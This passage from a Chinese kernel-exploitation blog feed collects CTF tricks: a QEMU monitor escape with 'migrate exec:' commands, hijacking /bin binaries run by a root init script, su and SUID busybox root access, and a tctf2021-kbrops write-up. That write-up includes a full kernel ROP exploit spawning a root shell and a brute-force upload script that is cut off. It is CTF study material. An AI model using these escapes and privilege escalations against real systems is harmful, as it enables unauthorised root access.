class="headerlink" title="奇技淫巧"></a>奇技淫巧</h1><h2 id="QEMU逃逸"><a href="#QEMU逃逸" class="headerlink" title="QEMU逃逸"></a>QEMU逃逸</h2><p>当qemu启动脚本中没有重定向monitor时，可以直接ctrl+A C逃逸，解压rootfs.img读flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">migrate <span class="string">&quot;exec:cp rootfs.img /tmp &quot;</span></span><br><span class="line">migrate <span class="string">&quot;exec:cd /tmp;zcat rootfs.img | cpio -idmv 1&gt;&amp;2&quot;</span></span><br><span class="line">migrate <span class="string">&quot;exec:cat /tmp/flag 1&gt;&amp;2&quot;</span></span><br><span class="line">(qemu) migrate <span class="string">&quot;exec:cat /tmp/flag 1&gt;&amp;2&quot;</span></span><br><span class="line">flag&#123;test_flag&#125;qemu-system-x86_64: failed to save SaveStateEntry with <span class="built_in">id</span>(name):)</span><br><span class="line">qemu-system-x86_64: Unable to write to <span class="built_in">command</span>: Broken pipe</span><br><span class="line">qemu-system-x86_64: Unable to write to <span class="built_in">command</span>: Broken pipe</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">zcat rootfs.cpio | cpio -idmv 1&gt;&amp;2</span><br></pre></td></tr></table></figure><h2 id="bin目录不为ROOT"><a href="#bin目录不为ROOT" class="headerlink" title="bin目录不为ROOT"></a>bin目录不为ROOT</h2><p>这样可以修改bin里面的命令，而init脚本在退出时，通常包含poweroff命令，或者umount命令，而init运行时是以root权限运行的，所以我们可以修改这些命令从而在输入exit命令调用init中在setsid剩下的命令时来直接cat flag或者获得shell</p><h2 id="根目录不为ROOT"><a href="#根目录不为ROOT" class="headerlink" title="根目录不为ROOT"></a>根目录不为ROOT</h2><p>那么在根目录下，虽然bin的所有者为root，但是可以对bin进行改名，然后我们伪造一个bin目录，里面放上我们伪造的命令，那么就可以以root权限调用这个伪造的命令了，如下为所示例子。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mv</span> bin evil_bin</span><br><span class="line">/evil_bin/mkdir bin</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;#!/evil_bin/sh&quot;</span> &gt; /bin/power</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;/evil_bin/sh&quot;</span> &gt;&gt; /bin/power</span><br><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure><h2 id="密码设置"><a href="#密码设置" class="headerlink" title="密码设置"></a>密码设置</h2><p>如果root账号的密码没有设置的话，直接su即可登录到root，非预期的。</p><p>又或者是默认的密码<code>#</code>,当然其实很多内核并没有提供su</p><p>例如linectf2022-encrypt</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">First, connect via netcat.</span><br><span class="line">We got a shell, let&#x27;s look around:</span><br><span class="line">/ $ ls</span><br><span class="line">=&gt; We see the flag file.</span><br><span class="line">/ $ cat flag</span><br><span class="line">=&gt; Not enough permissions.</span><br><span class="line">Are there many other users?</span><br><span class="line">/ $ cat /etc/passwd</span><br><span class="line">=&gt; Only root seems to be available. Let&#x27;s try switching to it:</span><br><span class="line">/ $ su</span><br><span class="line">/ #</span><br><span class="line">=&gt; See the #? This worked! We got root!</span><br><span class="line">/ # cat flag</span><br></pre></td></tr></table></figure><h2 id="suid"><a href="#suid" class="headerlink" title="suid"></a>suid</h2><p>带有suid的可执行文件允许我们拥有文件所有者的权限</p><p>还是lincectf2022的encrypt</p><p><code>find / -perm -u=s -type f 2&gt;/dev/null</code></p><p>打印的字符串告诉我们busybox具有这个权限位</p><p>Run busybox and it will show us all the configurations which are avialable</p><p>发现其中具有su于是</p><p><code>busybox su root</code></p><h1 id="linux支持"><a href="#linux支持" class="headerlink" title="linux支持"></a>linux支持</h1><h2 id="direct-map-addr-to-from-page-addr"><a href="#direct-map-addr-to-from-page-addr" class="headerlink" title="direct_map_addr_to/from_page_addr"></a>direct_map_addr_to/from_page_addr</h2><p>直接映射区的虚拟地址可以通过线性对应关系与vmemmap段的page结构相互转化</p><p>而每一个page结构体又对应着唯一一个PGN</p><p>又因为直接映射区上的地址减去<code>page_offset_base</code>就是物理内存地址,所以这些之间存在直观的直接线性关系</p><p>关系如下</p><p><strong>direct_map_addr_to_page_addr</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> <span class="title function_">direct_map_addr_to_page_addr</span><span class="params">(<span class="type">size_t</span> direct_map_addr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> page_count;</span><br><span class="line"></span><br><span class="line">    page_count = ((direct_map_addr &amp; (~<span class="number">0xfff</span>)) - page_offset_base) / <span class="number">0x1000</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> vmemmap_base + page_count * <span class="number">0x40</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>page_addr_to_direct_map_addr</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> <span class="title function_">page_addr_to_direct_map_addr</span><span class="params">(<span class="type">size_t</span> vmem_map_addr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> page_count;</span><br><span class="line"></span><br><span class="line">    page_count = ((vmem_map_addr &amp; (~<span class="number">0x40</span>)) - vmemmap_base) / <span class="number">0x40</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> direct_map_addr + page_count * <span class="number">0x1000</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="setreuid-setregid"><a href="#setreuid-setregid" class="headerlink" title="setreuid/setregid"></a>setreuid/setregid</h2><p>内核判断用户的依据是当前进程<code>cred</code>结构体中<code>uid</code>与<code>euid</code>两个字段</p><p>特别的当我们需要提权为<code>root</code>时</p><p>必须要<code>uid</code>与<code>euid</code>两个字段<strong>都为0</strong>,linux才会认为我们是<code>root</code>用户(在做过一些尝试后,可以确认至少较高版本是这样的,至于低版本尚未确认)</p><p>如果仅有其中一个字段为<code>0</code>,内核并不会将我们视作特权用户</p><p>提权时当然最好能够同时将这<code>uid</code>与<code>euid</code>都修改为<code>0</code>,但若是条件不允许,仅仅能修改其中的一个,我们就可以利用<code>setreuid(0,0)</code>来进一步的提权</p><p>当执行<code>setreuid(0,0)</code>时,只要<code>uid</code>与<code>euid</code>中任意一个为<code>0</code>,便能够将另一个也修改为<code>0</code>,进而成为被操作系统认可的<code>root</code>用户</p><p>此外:<code>suid</code>并不具备这样的能力</p><p>看内核源码:(<code>/kernel/sys.c</code>)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Unprivileged users may change the real uid to the effective uid</span></span><br><span class="line"><span class="comment"> * or vice versa.  (BSD-style)</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * If you set the real uid at all, or set the effective uid to a value not</span></span><br><span class="line"><span class="comment"> * equal to the real uid, then the saved uid is set to the new effective uid.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This makes it possible for a setuid program to completely drop its</span></span><br><span class="line"><span class="comment"> * privileges, which is often a useful assertion to make when you are doing</span></span><br><span class="line"><span class="comment"> * a security audit over a program.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The general idea is that a program which uses just setreuid() will be</span></span><br><span class="line"><span class="comment"> * 100% compatible with BSD.  A program which uses just setuid() will be</span></span><br><span class="line"><span class="comment"> * 100% compatible with POSIX with saved IDs.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">long</span> __sys_setreuid(<span class="type">uid_t</span> ruid, <span class="type">uid_t</span> euid)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">ns</span> =</span> current_user_ns();</span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">new</span>;</span></span><br><span class="line"><span class="type">int</span> retval;</span><br><span class="line"><span class="type">kuid_t</span> kruid, keuid;</span><br><span class="line"></span><br><span class="line">kruid = make_kuid(ns, ruid);</span><br><span class="line">keuid = make_kuid(ns, euid);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((ruid != (<span class="type">uid_t</span>) <span class="number">-1</span>) &amp;&amp; !uid_valid(kruid))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"><span class="keyword">if</span> ((euid != (<span class="type">uid_t</span>) <span class="number">-1</span>) &amp;&amp; !uid_valid(keuid))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">new = prepare_creds();</span><br><span class="line"><span class="keyword">if</span> (!new)</span><br><span class="line"><span class="keyword">return</span> -ENOMEM;</span><br><span class="line">old = current_cred();</span><br><span class="line"></span><br><span class="line">retval = -EPERM;</span><br><span class="line"><span class="keyword">if</span> (ruid != (<span class="type">uid_t</span>) <span class="number">-1</span>) &#123;</span><br><span class="line">new-&gt;uid = kruid;</span><br><span class="line"><span class="keyword">if</span> (!uid_eq(old-&gt;uid, kruid) &amp;&amp;</span><br><span class="line">    !uid_eq(old-&gt;euid, kruid) &amp;&amp;</span><br><span class="line">    !ns_capable_setid(old-&gt;user_ns, CAP_SETUID))</span><br><span class="line"><span class="keyword">goto</span> error;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (euid != (<span class="type">uid_t</span>) <span class="number">-1</span>) &#123;</span><br><span class="line">new-&gt;euid = keuid;</span><br><span class="line"><span class="keyword">if</span> (!uid_eq(old-&gt;uid, keuid) &amp;&amp;</span><br><span class="line">    !uid_eq(old-&gt;euid, keuid) &amp;&amp;</span><br><span class="line">    !uid_eq(old-&gt;suid, keuid) &amp;&amp;</span><br><span class="line">    !ns_capable_setid(old-&gt;user_ns, CAP_SETUID))</span><br><span class="line"><span class="keyword">goto</span> error;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!uid_eq(new-&gt;uid, old-&gt;uid)) &#123;</span><br><span class="line">retval = set_user(new);</span><br><span class="line"><span class="keyword">if</span> (retval &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> error;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (ruid != (<span class="type">uid_t</span>) <span class="number">-1</span> ||</span><br><span class="line">    (euid != (<span class="type">uid_t</span>) <span class="number">-1</span> &amp;&amp; !uid_eq(keuid, old-&gt;uid)))</span><br><span class="line">new-&gt;suid = new-&gt;euid;</span><br><span class="line">new-&gt;fsuid = new-&gt;euid;</span><br><span class="line"></span><br><span class="line">retval = security_task_fix_setuid(new, old, LSM_SETID_RE);</span><br><span class="line"><span class="keyword">if</span> (retval &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> error;</span><br><span class="line"></span><br><span class="line">retval = set_cred_ucounts(new);</span><br><span class="line"><span class="keyword">if</span> (retval &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> error;</span><br><span class="line"></span><br><span class="line">flag_nproc_exceeded(new);</span><br><span class="line"><span class="keyword">return</span> commit_creds(new);</span><br><span class="line"></span><br><span class="line">error:</span><br><span class="line">abort_creds(new);</span><br><span class="line"><span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">SYSCALL_DEFINE2(setreuid, <span class="type">uid_t</span>, ruid, <span class="type">uid_t</span>, euid)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> __sys_setreuid(ruid, euid);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到,不考虑特权用户的情况下</p><p>要设置<code>uid</code>,必须要<code>uid,euid</code>中至少一个为目标id</p><p>要设置<code>euid</code>,必须要<code>uid,euid,suid</code>中至少一个为目标id</p><h2 id="secondary-startup-64"><a href="#secondary-startup-64" class="headerlink" title="secondary_startup_64"></a>secondary_startup_64</h2><p>一般情况下</p><p>在直接映射区<code>direct_mapping_area+0x9d000</code>的位置</p><p>会有一个函数指针<code>secondary_startup_64</code></p><p>且其就在<code>kernel text</code>开头的部分,一般等于<code>kernel text+0x70</code></p><h2 id="内存大小对kernelpwn的影响"><a href="#内存大小对kernelpwn的影响" class="headerlink" title="内存大小对kernelpwn的影响"></a>内存大小对kernelpwn的影响</h2><blockquote><p>This file implements KASLR memory randomization for x86_64. It randomizes the virtual address space of kernel memory regions (physical memory mapping, vmalloc &amp; vmemmap) for x86_64. This security feature mitigates exploits relying on predictable kernel addresses.</p></blockquote><p>kaslr主要针对以下三个区域</p><ul><li>direct mapping area</li><li>vmalloc area</li><li>virtual memory map area</li></ul><p>更多相关可以在<code>/arch/x86/mm/kaslr.c</code>中查看</p><p><code>kaslr</code>的随机化粒度是<code>256m</code>,粒度即说明kaslr随机化范围的最小单位</p><p>当分配的内存大小小于<code>256M</code>时,因为加载的内存达不到一个粒度</p><p>我们可以简单的得到:</p><p><code>page_offset_base = heap_leak &amp; 0xffffffffff0000000</code></p><p>但在 MEM &gt; 256M 的机器上,这并不总是准确的,我们只能得到本粒度的基址</p><p>因此要获得确切的基址就需要办法获得一些能够大致确定其范围的能力,不过好在一般内核pwn题内存都不会大于256m,而就算大于256m,也会优先使用较低的</p><p>当 MEM &gt; 16G时,vmemmap_base也不能使用上面的代码实现,不过好在一般也不会有这种情况</p>]]></content>
    
    
    <summary type="html">简单记一些东西</summary>
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="pwn" scheme="https://ixout.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>kernel练习记录</title>
    <link href="https://ixout.github.io/posts/3059/"/>
    <id>https://ixout.github.io/posts/3059/</id>
    <published>2024-03-19T14:53:49.000Z</published>
    <updated>2024-04-06T12:12:24.260Z</updated>
    
    <content type="html"><![CDATA[<h1 id="题录"><a href="#题录" class="headerlink" title="题录"></a>题录</h1><h2 id="tctf2021-kbrops"><a href="#tctf2021-kbrops" class="headerlink" title="tctf2021-kbrops"></a>tctf2021-kbrops</h2><p>这道题比较特殊在其flag并不是作为文件系统中的一个文件形式存在</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">stty</span> intr ^]</span><br><span class="line"><span class="built_in">cd</span> `<span class="built_in">dirname</span> <span class="variable">$0</span>`</span><br><span class="line"><span class="built_in">timeout</span> --foreground 300 qemu-system-x86_64 \</span><br><span class="line">    -m 256M \</span><br><span class="line">    -enable-kvm \</span><br><span class="line">    -cpu host,+smep,+smap \</span><br><span class="line">    -kernel bzImage \</span><br><span class="line">    -initrd initramfs.cpio.gz \</span><br><span class="line">    -nographic \</span><br><span class="line">    -monitor none \</span><br><span class="line">    -drive file=flag.txt,format=raw \</span><br><span class="line">    -snapshot \</span><br><span class="line">    -append <span class="string">&quot;console=ttyS0 kaslr kpti quiet oops=panic panic=1&quot;</span></span><br></pre></td></tr></table></figure><p>而是将 flag 作为一个设备载入，因此我们需要读取 <code>/dev/sda</code> 以获取 flag，这仍然需要 root 权限</p><p>模块十分十分简单仅仅是实现了一个选项为<code>0x666</code>的ioctl</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/t01fa730a1572f2f1d0.png" alt=""></p><p>会取我们传入的前两个字节作为后续拷贝的 size，之后 kmalloc 一个 object，从我们传入的第三个字节开始拷贝，之后再从 object 拷贝到栈上，这里有个十分明显的栈溢出</p><p>既然目前有了栈溢出，而且没有 stack canary 保护，比较朴素的提权方法就是执行 <code>commit_creds(prepare_kernel_cred(NULL))</code> 提权到 root，但是由于开启了 kaslr，因此我们还需要知道 kernel offset，但是毫无疑问的是仅有一个栈溢出是没法让我们直接泄漏出内核中的数据的</p><p>最简单最暴力的方法就是爆破了,可以知道内核kaslr的随机化只有9位</p><p>爆破个几百次总能成功 :(</p><p><strong>exp:</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PREPARE_KERNEL_CRED 0xffffffff81090c20</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COMMIT_CREDS 0xffffffff810909b0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RDI_RET 0xffffffff81001619</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SWAPGS_RET 0xffffffff81b66d10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRETQ_RET 0xffffffff8102984b</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0Xffffffff81c00df0</span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">saveStatus</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">getRootShell</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;   </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] Backing from the kernelspace.\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> ** argv, <span class="type">char</span> ** envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span>    *buf;</span><br><span class="line">    <span class="type">size_t</span>  *<span class="built_in">stack</span>;</span><br><span class="line">    <span class="type">int</span>     i;</span><br><span class="line">    <span class="type">int</span>     chal_fd;</span><br><span class="line">    <span class="type">size_t</span>  offset;</span><br><span class="line"></span><br><span class="line">    offset = (argv[<span class="number">1</span>]) ? atoi(argv[<span class="number">1</span>]) : <span class="number">0</span>;</span><br><span class="line">    saveStatus();</span><br><span class="line">    buf = <span class="built_in">malloc</span>(<span class="number">0x2000</span>);</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="string">&#x27;A&#x27;</span>, <span class="number">0x2000</span>);</span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">stack</span> = (<span class="type">size_t</span>*)(buf + <span class="number">0x102</span>);</span><br><span class="line">    <span class="built_in">stack</span>[i++] = <span class="number">0</span>;               </span><br><span class="line">    <span class="built_in">stack</span>[i++] = <span class="number">0</span>;       </span><br><span class="line">    <span class="built_in">stack</span>[i++] = POP_RDI_RET + offset;</span><br><span class="line">    <span class="built_in">stack</span>[i++] = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">stack</span>[i++] = PREPARE_KERNEL_CRED + offset;</span><br><span class="line">    <span class="built_in">stack</span>[i++] = COMMIT_CREDS + offset;</span><br><span class="line">    <span class="built_in">stack</span>[i++] = SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + <span class="number">22</span> + offset;</span><br><span class="line">    <span class="built_in">stack</span>[i++] = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">stack</span>[i++] = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">stack</span>[i++] = (<span class="type">size_t</span>) getRootShell;</span><br><span class="line">    <span class="built_in">stack</span>[i++] = user_cs;</span><br><span class="line">    <span class="built_in">stack</span>[i++] = user_rflags;</span><br><span class="line">    <span class="built_in">stack</span>[i++] = user_sp;</span><br><span class="line">    <span class="built_in">stack</span>[i++] = user_ss;</span><br><span class="line">    ((<span class="type">unsigned</span> <span class="type">short</span> *)(buf))[<span class="number">0</span>] = <span class="number">0x112</span> + i * <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">    chal_fd = open(<span class="string">&quot;/proc/chal&quot;</span>, O_RDWR);</span><br><span class="line">    ioctl(chal_fd, <span class="number">0x666</span>, buf);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>远程脚本</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./exp&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    exp = base64.b64encode(f.read())</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./run.sh&#x27;</span>)<span class="comment">#remote(&quot;127.0.0.1&quot;, 1234)</span></span><br><span class="line">try_count = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    log.info(<span class="string">&quot;no.&quot;</span> + <span class="built_in">str</span>(try_count) + <span class="string">&quot; time(s)&quot;</span>)</span><br><span class="line">    p.sendline()</span><br><span class="line">    p.recvuntil(<span class="string">&quot;~ $&quot;</span>)</span><br><span class="line"></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(exp), <span class="number">0x200</span>):</span><br><span class="line">        p.sendline(<span class="string">&quot;echo -n \&quot;&quot;</span> + exp[i:i + <span class="number">0x200</span>].decode() + <span class="string">&quot;\&quot; &gt;&gt; b64_exp&quot;</span>)</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> 